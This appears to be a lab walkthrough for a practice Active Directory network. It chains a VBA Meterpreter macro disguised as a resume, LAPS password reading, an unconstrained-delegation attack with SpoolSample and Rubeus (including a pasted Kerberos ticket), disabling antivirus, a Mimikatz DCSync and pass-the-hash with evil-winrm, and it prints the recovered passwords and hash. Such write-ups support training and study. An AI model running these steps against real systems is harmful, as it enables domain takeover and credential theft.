
Add web05.infinity.com to /etc/hosts and navigate to the site

-create a VBA Script and upload the resume

https://github.com/cviper480/OSEP/blob/main/VBA/VB_Meterpreter.vba

This gets you a shell on .122

```
PS C:\users\ted> whoami
whoami
infinity\ted
```

use this to generate a better shell

https://github.com/Sh3lldon/FullBypass

then use this to extract the LAPS passwords, we identified the LAPS dll in the "Program Files"

https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-laps/

```
CLIENT
{y)aof(dFuGX1)5}
```

```
WEB05
{f1{ann.c21/zRj}
```

```
xfreerdp3 /v:WEB05 /u:Administrator /p:"f1{ann.c21/zRj"
```

```
xfreerdp3 /v:CLIENT /u:Administrator /p:"y)aof(dFuGX1)5"
```

Once you are on this machine, the vulnerability is unconstrained delegation

### Rubeus
Start Rubeus in monitor mode
```
.\Rubeus.exe monitor /interval:5 /nowrap
```

now you have to execute spoolsample.exe onto a machine so a user can execute it. I used CLIENT and user Ted. I identified that programs can be ran through "Program Files" by any user, so I placed the executable in the LAPS folder. 

```
PS C:\Program Files\laps> .\SpoolSample.exe DC03.infinity.com WEB05.infinity.com
```

Execute this a few times and you should capture the DC03 ticket and add the ticket to cache

```
.\rubeus.exe ptt /ticket:doIFDDCCBQigAwIBBaEDAgEWooIEFDCCBBBhggQMMIIECKADAgEFoQ4bDElORklOSVRZLkNPTaIhMB+gAwIBAqEYMBYbBmtyYnRndBsMSU5GSU5JVFkuQ09No4IDzDCCA8igAwIBEqEDAgECooIDugSCA7a5v1DI18HZlfapVJ7hnbnotGvVUJfVMwWaSWeVOINuDpjYDqaWfy6X7zz/aFKFNlmky/VvGZKHl/7BPbZlT3xu6xhyzSU7JqumKuORosnpiVwVgb8aC3yJyHw7CA8ftPW4x/gdzZVW3gL5U+/s3B2TZ4RHCfJxrLMG/ksKNbaoyXGfXJSw1octaonWZY964nEcWn2xfqqIs3+9TQRJXnQMgT43c/sbhG5bYmXLZDOXDZrltvFLe8MPFItxrddSRQFa9aFvcn/9w3VIhtiELW6px5CKwS3AOXIg2CIdsNc87+WXiSDeSdxV4L0/VXiXjrE1vvG/Qv3h6Zi2tX4dUfwTwyqJFugbkeqt5VEHD8mrcq7FJZnP2pyOwHoaYbRV7UnkqccL/bYAqEKA8QomytNKxCxcAMTkf18pYrwNZWBPadh553JbVa/YFn4Os8dUjQkdLyI7yPMhTdEYChcbJt+IAbJ7qrCpiwcFCqMS59gwtYH+QW7XUTgQyG6Pn2bBZ1jYp1oqtlqMEf3q+B1Q8ToRkCZp6JzYv0Sm8tkhNFVgC3YmplT/BdonS/bX1QZ/w+okIj9o0ZaJh4oAGkbok6W1hWJwH3Ee+/Kq8gGWw9XPSac67GR5YOMAju7FC0pY6RfK1np/hML37RkV00qptRL61f8s9I9hUl5Y+O2lhy6U8Q2S+36g6ydqAa9RvDeQ3KWHSURmQ3T0ERNLaRXL39vXltGr9/cULYWTJ+RUVud/i0DZjzLSYkwo+35NqsbrfC8hfqvhSPnf2VkVxcMgY3pQW1VLpVj6qLaS/4h+veeKTOahcBmOMKq95jcuSQnzldOXVS/kUoNccGMYN0FPlSyWI+vkD+c5C0dp+7KuNmO3NY5Wm+3uRrvaRaEjYAh4OM9QqGME3BaqetQkWNRfbC4LUuBVkc9xwsIJshxDlM/Gpjt91EYNbIz2IlXu3tKyf5hF6CXVPk/bfE/aJINxfVTb/O2cJUsphkkS9AL6dN1PPL6rThcOyaRBkBAdt0aSl8Esx9iv0e2f3toDQH9W0hs35MJZAdNCM1obigdsuEsyjLTaRL65g4r4XmFBT1cfisboMeSZ+C0g7wwmDoVJtVGPRGIsUv/QbdOhXDlNZoXbxmCDMUNQUAFrla6lLEk3/GM8kvrBDpIvSbNSqPRo4z49N5LFl7Rfs/u9toyNj2o1fV53UFbS1ev6ivW0NsLm36lZkLYu59nGyHVuYPFpywYjdWs5HkClRYovzoiJiHP8r6k58lZxiqOB4zCB4KADAgEAooHYBIHVfYHSMIHPoIHMMIHJMIHGoCswKaADAgESoSIEICjvh7Tx0BAFCkH8c+Uvrb2nnD+N/NAUZlPawJhsE3mIoQ4bDElORklOSVRZLkNPTaISMBCgAwIBAaEJMAcbBURDMDMkowcDBQBgoQAApREYDzIwMjUwMzA1MTgwMjM5WqYRGA8yMDI1MDMwNjA0MDIzN1qnERgPMjAyNTAzMTIxODAyMzdaqA4bDElORklOSVRZLkNPTakhMB+gAwIBAqEYMBYbBmtyYnRndBsMSU5GSU5JVFkuQ09N 
```

Now turn off AV as administrator and perform a DCSync with Mimikatz

```
lsadump::dcsync /user:administrator
```

then login with the DC Admin Hash
```
evil-winrm -i 192.168.178.120 -u "administrator" -H "5f9163ca3b673adfff2828f368ca3760"
```